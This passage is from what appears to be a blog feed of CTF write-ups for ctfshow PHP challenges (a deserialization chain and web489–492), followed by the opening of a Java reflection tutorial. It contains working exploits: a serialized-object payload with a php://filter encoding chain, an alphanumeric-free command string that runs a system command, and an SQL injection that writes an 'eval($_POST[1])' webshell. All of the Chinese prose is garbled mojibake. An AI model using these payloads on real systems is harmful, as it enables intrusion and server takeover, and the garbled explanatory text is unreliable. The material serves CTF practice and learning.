class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">#unserialize($c);</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">           <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">               <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;ç»•ä¸€ä¸‹å§å­©å­&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">               <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">               <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯åˆ©ç”¨__tostringæ–¹æ³•äº†<br>æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°äº†ä¸€ä¸ªæ–‡ä»¶å†™å…¥å’Œè¯»å–ã€‚<br>è¯»å–çš„äº†ctfw.txtå¹¶å°†å†…å®¹æ‹¼æ¥åˆ°äº†å‘½ä»¤æ‰§è¡Œä¸­<br>æˆ‘çš„æƒ³æ³•æ˜¯å†™å…¥urldecodeè¿™æ ·å°±å¯ä»¥å°†å…¶å˜ä¸º<code>eval($_GET[&#39;cmd&#39;])</code>ç„¶åå†ä½¿ç”¨æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œå°±å¯ä»¥äº†</p><p>è€Œè¦æƒ³å†™å…¥urldecodeå°±éœ€è¦å°†å‰é¢çš„åƒåœ¾å­—ç¬¦æ¶ˆé™¤ä¸ç„¶ä¼šæŠ¥é”™</p><h2 id="base64æ¶ˆé™¤åƒåœ¾å­—ç¬¦"><a href="#base64æ¶ˆé™¤åƒåœ¾å­—ç¬¦" class="headerlink" title="base64æ¶ˆé™¤åƒåœ¾å­—ç¬¦"></a>base64æ¶ˆé™¤åƒåœ¾å­—ç¬¦</h2><p>æˆ‘åœ¨å†™è¿™é¢˜æ—¶ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†ä½¿ç”¨base64-decodeè¿™ä¸ªè¿‡æ»¤å™¨æ¥è¿›è¡Œæ¶ˆé™¤ã€‚ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªåœ¨å¤šæ¬¡è§£ç åä¼šå½±å“åŸç¼–ç å­—ç¬¦<br>äºæ˜¯æˆ‘æŸ¥çœ‹äº†wp<br>wpé‡Œå†™äº†æ¶ˆé™¤çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨å‰é¢åŠ ä¸€ä¸ªAV@çš„base64ç¼–ç ï¼Œå› ä¸ºAV@åœ¨è§£ç åæ˜¯éç è¡¨å­—ç¬¦è¿™æ ·å°±å¯ä»¥ä¿éšœä¸ä¼šå½±å“æˆ‘ä»¬è¦å†™å…¥çš„å­—ç¬¦å¦‚ä¸‹<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/31.png" class="" title="alt text"></p><p>ä½†æ˜¯è¿™é¢˜é™å®šäº†åªèƒ½ä½¿ç”¨ä¸€æ¬¡base64è§£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨å…¶ä»–ç¼–ç æ–¹æ³•æ¥ä¸€æ¬¡å°±æ¶ˆé™¤å­—ç¬¦</p><h2 id="ä½¿ç”¨å­—ç¬¦ç¼–ç è½¬æ¢-base64-decodeæ¶ˆé™¤å­—ç¬¦"><a href="#ä½¿ç”¨å­—ç¬¦ç¼–ç è½¬æ¢-base64-decodeæ¶ˆé™¤å­—ç¬¦" class="headerlink" title="ä½¿ç”¨å­—ç¬¦ç¼–ç è½¬æ¢+base64-decodeæ¶ˆé™¤å­—ç¬¦"></a>ä½¿ç”¨å­—ç¬¦ç¼–ç è½¬æ¢+base64-decodeæ¶ˆé™¤å­—ç¬¦</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“phpä¸­base64_decodeä¼šå°†éç è¡¨å­—ç¬¦è¿›è¡Œæ¶ˆé™¤ã€‚é‚£ä¹ˆæˆ‘ä»¬å…ˆå°†åƒåœ¾å­—ç¬¦å˜ä¸ºéç è¡¨å­—ç¬¦åœ¨è§£ç ä¸å°±èƒ½ä¸€æ¬¡æ¶ˆé™¤äº†å—<br>ç›¸ä¿¡åœ¨æˆ‘ä»¬è¿›è¡Œå­—ç¬¦é›†çš„ç¼–ç è½¬æ¢æ—¶ç»å¸¸å‡ºç°åŸæœ¬æ˜¯è‹±æ–‡ä½†æ˜¯è½¬ä¸ªç¼–ç å°±æˆäº†ä¸­æ–‡ã€‚åŸç†å°±å·®ä¸å¤šæ˜¯è¿™ä¸ª<br>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹é¢çš„ä»£ç <br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/32.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°å…¶éƒ½å˜ä¸ºäº†ä¸­æ–‡å­—ç¬¦ã€‚è¿™æ˜¯è‹±æ–‡åœ¨utf-8è½¬ä¸ºutf-16æ—¶ä¼šåœ¨æ¯ä¸ªå­—æ¯ååŠ ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªä¸å¯è§å­—ç¬¦å°±ä¼šè¢«ç¼–ç ä¸ºå¥‡æ€ªçš„ä¸­æ–‡ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°†æˆ‘ä»¬æƒ³å†™å…¥çš„å­—ç¬¦ä¸²è½¬ä¸ºutf-16åœ¨åˆ©ç”¨ä¼ªåè®®è½¬ä¸ºutf-8é‚£ä¹ˆè¿™æ—¶æˆ‘ä»¬å†™å…¥çš„å­—ç¬¦æ˜¯æ­£å¸¸çš„ä½†æ˜¯åƒåœ¾å­—ç¬¦å´å˜æˆäº†ä¸­æ–‡ï¼Œåœ¨ä½¿ç”¨base64è§£ç å°±ä¼šæ¶ˆé™¤åƒåœ¾å­—ç¬¦<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/33.png" class="" title="alt text"><br>å¯ä»¥å‘ç°æˆåŠŸæ¶ˆé™¤åƒåœ¾å­—ç¬¦ã€‚<br>å¦å¤–å› ä¸ºfile_put_contentä¸èƒ½ç›´æ¥å¤„ç†ç©ºå­—ç¬¦å³æˆ‘ä»¬è¿˜éœ€è¦ä¸€éƒ¨ç¼–ç ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨quoted_printable_encode($c);æ¥ç¼–ç ã€‚<br>ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;urldecode&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$c</span>,<span class="string">&quot;utf-16le&quot;</span>,<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;ctfshowshowshowwww&quot;</span>.<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$a</span>,<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-16le&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">quoted_printable_encode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><br>payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=C:11:%22ArrayObject%22:186:&#123;x:i:0;a:1:&#123;i:1;O:3:%22ctf%22:2:&#123;s:2:%22h1%22;O:4:%22%73%68%6f%77%22:0:&#123;&#125;s:2:%22h2%22;a:1:&#123;i:0;a:3:&#123;i:0;s:0:%22%22;i:1;s:0:%22%22;i:2;O:10:%22Chu0_write%22:3:&#123;s:4:%22chu0%22;s:1:%221%22;s:4:%22chu1%22;s:1:%221%22;s:3:%22cmd%22;N;&#125;&#125;&#125;&#125;&#125;;m:a:0:&#123;&#125;&#125;&amp;chu0=d=00X=00J=00s=00Z=00G=00V=00j=00b=002=00R=00l=00&amp;name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=ctfw&amp;cmd=$_=(~%9E%8C%8C%9A%8D%8B);$__=(~%8C%86%8C%8B%9A%92%D7%DD%9C%9E%8B%DF%D0%99%93%9E%98%DD%D6%C4);$_($__);</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">chu0=1&amp;name=1&amp;show%5Bshow.show=1&amp;cmd=1</span><br></pre></td></tr></table></figure><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/34.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜</title>
      <link href="/2024/09/04/%E5%88%B7%E9%A2%98/"/>
      <url>/2024/09/04/%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤ªä¹…æ²¡æ›´åšå®¢äº†ï¼Œæ”¾å‡çš„æ—¶å€™æ”¾æ‡’äº†ï¼Œå±äºæ˜¯æ”¾å‡å‰XXXæ”¾å‡åXXXäº†ã€‚ä¸‹æ¬¡æš‘å‡ä¸èƒ½å†åœ¨å®¶é‡Œé—²ç€äº†ï¼Œå¾—å»æ‰“æ‰“HVVäº†ã€‚ç”±äºå¤ªä¹…æ²¡æ›´åšå®¢ä¹Ÿä¸çŸ¥é“æ›´äº›ä»€ä¹ˆï¼Œå°±æ›´ä¸€äº›åˆ·é¢˜çš„è¿‡ç¨‹å§ã€‚"><a href="#å¤ªä¹…æ²¡æ›´åšå®¢äº†ï¼Œæ”¾å‡çš„æ—¶å€™æ”¾æ‡’äº†ï¼Œå±äºæ˜¯æ”¾å‡å‰XXXæ”¾å‡åXXXäº†ã€‚ä¸‹æ¬¡æš‘å‡ä¸èƒ½å†åœ¨å®¶é‡Œé—²ç€äº†ï¼Œå¾—å»æ‰“æ‰“HVVäº†ã€‚ç”±äºå¤ªä¹…æ²¡æ›´åšå®¢ä¹Ÿä¸çŸ¥é“æ›´äº›ä»€ä¹ˆï¼Œå°±æ›´ä¸€äº›åˆ·é¢˜çš„è¿‡ç¨‹å§ã€‚" class="headerlink" title="å¤ªä¹…æ²¡æ›´åšå®¢äº†ï¼Œæ”¾å‡çš„æ—¶å€™æ”¾æ‡’äº†ï¼Œå±äºæ˜¯æ”¾å‡å‰XXXæ”¾å‡åXXXäº†ã€‚ä¸‹æ¬¡æš‘å‡ä¸èƒ½å†åœ¨å®¶é‡Œé—²ç€äº†ï¼Œå¾—å»æ‰“æ‰“HVVäº†ã€‚ç”±äºå¤ªä¹…æ²¡æ›´åšå®¢ä¹Ÿä¸çŸ¥é“æ›´äº›ä»€ä¹ˆï¼Œå°±æ›´ä¸€äº›åˆ·é¢˜çš„è¿‡ç¨‹å§ã€‚"></a>å¤ªä¹…æ²¡æ›´åšå®¢äº†ï¼Œæ”¾å‡çš„æ—¶å€™æ”¾æ‡’äº†ï¼Œå±äºæ˜¯æ”¾å‡å‰XXXæ”¾å‡åXXXäº†ã€‚ä¸‹æ¬¡æš‘å‡ä¸èƒ½å†åœ¨å®¶é‡Œé—²ç€äº†ï¼Œå¾—å»æ‰“æ‰“HVVäº†ã€‚ç”±äºå¤ªä¹…æ²¡æ›´åšå®¢ä¹Ÿä¸çŸ¥é“æ›´äº›ä»€ä¹ˆï¼Œå°±æ›´ä¸€äº›åˆ·é¢˜çš„è¿‡ç¨‹å§ã€‚</h1><h1 id="ctfshow-web489"><a href="#ctfshow-web489" class="headerlink" title="ctfshow web489"></a>ctfshow web489</h1><p>è¿™ä¸€é¢˜å’Œweb488å¾ˆåƒç®—æ˜¯å‡çº§ç‰ˆï¼Œæ‰€ä»¥æˆ‘å°±è®°ä¸€ä¸‹è¿™ä¸€é¢˜ã€‚<br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å†å‚æ•°actionä¸‹å‘ç°æ–‡ä»¶è¯»å–æ¼æ´<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/1.png" class="" title="alt text"><br>ä½†æ˜¯ç»è¿‡å°è¯•å‘ç°å…¶å¹¶ä¸ä¼šæŠ¥é”™è€Œweb488å­˜åœ¨æŠ¥é”™ï¼Œå°†æºç æ‰’ä¸‹æ¥ã€‚<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/2.png" class="" title="alt text"><br>å›å‘ç°å…¶å†file_class.phpæ·»åŠ äº†error_reporting(0);è¿™å¯¼è‡´ç½‘é¡µæ²¡æœ‰æŠ¥é”™ã€‚<br>æˆ‘ä»¬å®¡è®¡ä»£ç ä¼šå‘ç°<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/3.png" class="" title="alt text"><br><code>extract($GET)</code>è€Œè¿™ä¸ªå‡½æ•°å°±å­˜åœ¨äº†å‚æ•°è¦†ç›–ï¼Œå³æˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–sqlè¿™ä¸ªå˜é‡æ¥è¿›è¡Œsqlæ³¨å…¥æˆ–è€…ç»•è¿‡ç™»é™†<br>ä½†è¿™è¿˜æ— æ³•å¾—åˆ°flagï¼Œè¿™é“é¢˜ç›®éœ€è¦æˆ‘ä»¬æ ¹ç›®å½•çš„flagã€‚<br>è¿›ä¸€æ­¥å®¡ä»£ç ä¼šå‘ç°file_class.phpä¸‹å­˜åœ¨file_put_contentså‡½æ•°<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/4.png" class="" title="alt text"><br>é‚£ä¹ˆæ€è·¯å°±æœ‰äº†ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥å‘ä¸Šå®¡ä»£ç <br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/5.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/6.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/7.png" class="" title="alt text"><br>æœ€ç»ˆä¼šå†index.phpå‘ç°åªè¦æˆ‘ä»¬æˆåŠŸç™»é™†å°±å¯ä»¥é€šè¿‡æ“ä½œusernameçš„å€¼æ¥æ“æ§contentçš„å€¼<br>è€Œç¼“å­˜<code>cache::create_cache</code>ä¼šåœ¨cache/md5(â€˜indexâ€™).php,ä¸‹å†™å…¥ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬åªè¦å°è¯•ç»•è¿‡ç™»é™†ã€‚ç„¶åé€šè¿‡æ“æ§<code>$username</code>æ¥å†™å…¥webshellæ¥è¯»å–æ–‡ä»¶<br>æŸ¥çœ‹è¯¥ä»£ç ä¼šå‘ç°åªè¦èƒ½æŸ¥åˆ°å†…å®¹å³å¯ä»¥ç»•è¿‡éªŒè¯æˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>select+id+from+user+where+username=&#39;1&#39;+union+select+1</code>å³å¯<br>è€Œåå†usernameä¼ å…¥webshellå³å¯æˆåŠŸä¸Šé©¬ã€‚<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/8.png" class="" title="alt text"></p><h1 id="ctfshow-web490"><a href="#ctfshow-web490" class="headerlink" title="ctfshow web490"></a>ctfshow web490</h1><p>ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ä½†æ˜¯å…¶å°†extract()æ”¾åœ¨äº†<code>$sql</code>å®šä¹‰çš„ä¸Šé¢å¯¼è‡´æ— æ³•ä½¿ç”¨å˜é‡è¦†ç›–æ¥æ“æ§sqlçš„å€¼ï¼Œä½†æ˜¯å…¶userå¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œè€Œä¼ å…¥çš„<code>$template</code>å˜ä¸ºäº†<code>$user-&gt;username</code>å› ä¸ºå¯ä»¥sqlæ³¨å…¥æ‰€æœ‰æˆ‘ä»¬å¯ä»¥æ“æ§<code>$user-&gt;username</code>çš„å€¼å³æˆ‘ä»¬å¯ä»¥å†™å…¥webshell<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/9.png" class="" title="alt text"><br>è€Œå…¶shadeè¿›è¡Œäº†æ›´æ”¹ï¼Œå…¶å†™å…¥çš„valueè¢«<code>&lt;?=?&gt;</code>åŒ…è£¹å³æˆ‘ä»¬å†™å…¥çš„webshellè¦è¿›è¡Œæ›´æ”¹<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/10.png" class="" title="alt text"><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=check&amp;username=1111&#x27;+union+select+&#x27;eval($_POST[1])&#x27;--+&amp;password=aaa</span><br></pre></td></tr></table></figure><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/11.png" class=""><br>æˆåŠŸå†™å…¥webshellåè¯»å–flagå³å¯</p><h1 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h1><p>è¿™é¢˜æˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ— æ³•å†å†™å…¥webshelläº†ä½†æ˜¯å…¶è¿˜æ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨sqlæ³¨å…¥æ¥è¯»å–æ–‡ä»¶ï¼Œè€Œå› ä¸ºè¿™æ˜¯ç›²æ³¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„šæœ¬è·‘ä¹Ÿå¯ä»¥äº§ç”Ÿäº›æ–‡ä»¶åˆ°/tmpè¿™ä¸ªä½æƒé™ç›®å½•<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/12.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/13.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/14.png" class="" title="alt text"><br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/15.png" class="" title="alt text"></p><h1 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h1><img src="/2024/09/04/%E5%88%B7%E9%A2%98/16.png" class=""><p>æˆ‘ä»¬å¯ä»¥å‘ç°ä¸Šè¿°ä»£ç æ— æ³•è¿›è¡Œsqlæ³¨å…¥äº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°å…¶userå˜é‡çš„å€¼æ˜¯å†ifæ¡ä»¶é‡Œè¿›è¡Œèµ‹å€¼çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦ä½¿å…¶æ— æ³•è¢«èµ‹å€¼çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨extractå‡½æ•°æ¥è¿›è¡Œå˜é‡è¦†ç›–äº†<br><img src="/2024/09/04/%E5%88%B7%E9%A2%98/17.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåå°„</title>
      <link href="/2024/07/14/java%E5%8F%8D%E5%B0%84/"/>
      <url>/2024/07/14/java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="æ”¾å‡å‰å°±ä¸€ç›´æƒ³ç€è¦åœ¨æš‘å‡å­¦ä¸€ä¸‹javaçš„æ¼æ´ï¼Œå¤§ä½“çœ‹äº†ä¸€ä¸‹å‘ç°javaçš„å†…å®¹ä¸æ˜¯ä¸€èˆ¬çš„å¤šï¼Œå°±ä»javaçš„åå°„å¼€å§‹å­¦å§ã€‚"><a href="#æ”¾å‡å‰å°±ä¸€ç›´æƒ³ç€è¦åœ¨æš‘å‡å­¦ä¸€ä¸‹javaçš„æ¼æ´ï¼Œå¤§ä½“çœ‹äº†ä¸€ä¸‹å‘ç°javaçš„å†…å®¹ä¸æ˜¯ä¸€èˆ¬çš„å¤šï¼Œå°±ä»javaçš„åå°„å¼€å§‹å­¦å§ã€‚" class="headerlink" title="æ”¾å‡å‰å°±ä¸€ç›´æƒ³ç€è¦åœ¨æš‘å‡å­¦ä¸€ä¸‹javaçš„æ¼æ´ï¼Œå¤§ä½“çœ‹äº†ä¸€ä¸‹å‘ç°javaçš„å†…å®¹ä¸æ˜¯ä¸€èˆ¬çš„å¤šï¼Œå°±ä»javaçš„åå°„å¼€å§‹å­¦å§ã€‚"></a>æ”¾å‡å‰å°±ä¸€ç›´æƒ³ç€è¦åœ¨æš‘å‡å­¦ä¸€ä¸‹javaçš„æ¼æ´ï¼Œå¤§ä½“çœ‹äº†ä¸€ä¸‹å‘ç°javaçš„å†…å®¹ä¸æ˜¯ä¸€èˆ¬çš„å¤šï¼Œå°±ä»javaçš„åå°„å¼€å§‹å­¦å§ã€‚</h1><h1 id="javaçš„åå°„æœºåˆ¶"><a href="#javaçš„åå°„æœºåˆ¶" class="headerlink" title="javaçš„åå°„æœºåˆ¶"></a>javaçš„åå°„æœºåˆ¶</h1><p>Javaçš„åå°„æœºåˆ¶æ˜¯Javaéå¸¸é‡è¦çš„åŠ¨æ€ç‰¹æ€§ï¼Œæˆ‘ä»¬å­¦è¿‡çš„phpå°±æœ‰ç€ä¸°å¯Œçš„åŠ¨æ€ç‰¹æ€§ã€‚è€Œjavaå¹¶æ²¡æœ‰phpé‚£ä¹ˆçš„çµæ´»ï¼Œæ‰€ä»¥javaåå°„æ‰€å¸¦æ¥çš„åŠ¨æ€ç‰¹æ€§å°±æ˜¾å¾—å’Œé‡è¦äº†ã€‚é€šè¿‡åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥å¾—åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•ï¼Œæ„é€ æ–¹æ³•ï¼Œæˆå‘˜å±æ€§ï¼Œè¿˜å¯ä»¥å®ä¾‹åŒ–ç±»ï¼Œè°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰</p><h1 id="æ”¾å°„çš„æ­¥éª¤"><a href="#æ”¾å°„çš„æ­¥éª¤" class="headerlink" title="æ”¾å°„çš„æ­¥éª¤"></a>æ”¾å°„çš„æ­¥éª¤</h1><p>æ”¾å°„çš„æ­¥éª¤åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ª<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.åå°„è·å–ç±»</span><br><span class="line">2.è·å–ç±»çš„æ–¹æ³•</span><br><span class="line">3.åˆ›å»ºç±»çš„å®ä¾‹åŒ–å¯¹è±¡</span><br><span class="line">4.ä½¿ç”¨ç±»çš„æ–¹æ³•</span><br></pre></td></tr></table></figure><br>ä¸‹é¢æˆ‘ä¼šç»™å‡ºæ¯ä¸ªæ­¥éª¤æ‰€ä½¿ç”¨çš„å‡½æ•°ã€‚</p><h2 id="åå°„è·å–ç±»"><a href="#åå°„è·å–ç±»" class="headerlink" title="åå°„è·å–ç±»"></a>åå°„è·å–ç±»</h2><h3 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h3><p>åœ¨åå°„ä¸­æœ€å¸¸ç”¨åˆ°çš„è·å–ç±»çš„å‡½æ•°å°±æ˜¯fornameã€‚<br>å…¶æœ‰å¦‚ä¸‹ä¸¤ç§è°ƒç”¨æ–¹æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name)</span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="type">boolean</span>** initialize, ClassLoader loader)</span><br></pre></td></tr></table></figure><br><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code>ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºåŠ è½½å™¨çš„é€‰æ‹©ã€‚<br>é»˜è®¤çš„è°ƒç”¨æ–¹æ³•å³ç¬¬ä¸€ç§è°ƒç”¨æ–¹æ³•ï¼Œå…¶é»˜è®¤ä¸ºä¼šåˆå§‹åŒ–ã€‚<br>å…³äºåˆå§‹åŒ–æˆ‘è¿™é‡Œç¨å¾®å±•å¼€è¯´ä¸€ä¸‹<br>é¦–å…ˆæˆ‘ä»¬çœ‹å¦‚ä¸‹ç±»åˆå§‹åŒ–åè¾“å‡ºçš„ç»“æœ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿™ä¸ªç±»åˆå§‹åŒ–åè¾“å‡ºç»“æœä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Static initial class TrainPrint</span><br><span 